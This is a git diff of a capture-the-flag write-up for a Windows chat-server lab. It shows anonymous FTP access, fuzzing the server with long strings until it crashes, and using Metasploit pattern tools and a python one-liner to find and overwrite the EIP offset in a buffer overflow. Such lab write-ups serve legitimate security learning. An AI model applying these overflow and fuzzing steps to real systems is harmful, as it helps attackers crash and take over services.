@@ -83,6 +83,11 @@ starting with username:password anonymous:anonymous, anonymous worked but not ad
 └─$ ftp THM_Target
 Connected to THM_Target.
 220 Microsoft FTP Service
+Name (THM_Target:hostusername): admin
+331 Password required for admin.
+Password:
+530 User cannot log in.
+...
 Name (THM_Target:hostusername): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password: 
@@ -143,28 +148,6 @@ mget essfunc.dll [anpqy?]? y
 30761 bytes received in 00:01 (16.23 KiB/s)
 ftp> 
 ```
-
-Telnet tried initially before FTP but traversing directories did not work 
-```
-┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainStorm]
-└─$ telnet 10.49.174.168 21
-Trying 10.49.174.168...
-Connected to 10.49.174.168.
-Escape character is '^]'.
-220 Microsoft FTP Service
-...
-USER admin
-331 Password required for admin.
-PASS admin
-530 User cannot log in.
-USER anonymous
-331 Anonymous access allowed, send identity (e-mail name) as password.
-PASS anonymous
-230 User logged in.
-...
-quit
-```   
-
 Initial Test of chatserver
 - Test name limit with 30 characters and message area with long string of A's
 
@@ -199,7 +182,10 @@ When 2500 sent automatically crashed no reply
 ```
 Write a message:  AAAAAAAAAAAAAA...total of 2000 sent and server crashed here about like in first send.
 ```
-There is a better way to find the EIP
+
+### There is a better way to find the EIP
+
+- EIP is the x86 equivalent of rip used with x86-64, its only 4 bytes not 8. Similarly its necessary to overflow into it to replace the return address.
 
 Metasploit pattern tools found in kali installation can help here:
 located in: /usr/share/metasploit-framework/tools/exploit/
@@ -259,7 +245,10 @@ This is what was used to generate the 3000 characters, resolve EIP location and 
 ┌──(hacktopuser㉿hacktop)-[~/Desktop]
 └─$ python3 -c "print('A'*2012+'B'*4)"     
 AAAAAAAAAA......AAAABBBB
-```                                                                                                                                                      
+```
+This effectively showed EIP replaced wtih 42424242 swith EAX replaced with AAA...
+
+
 
 
 
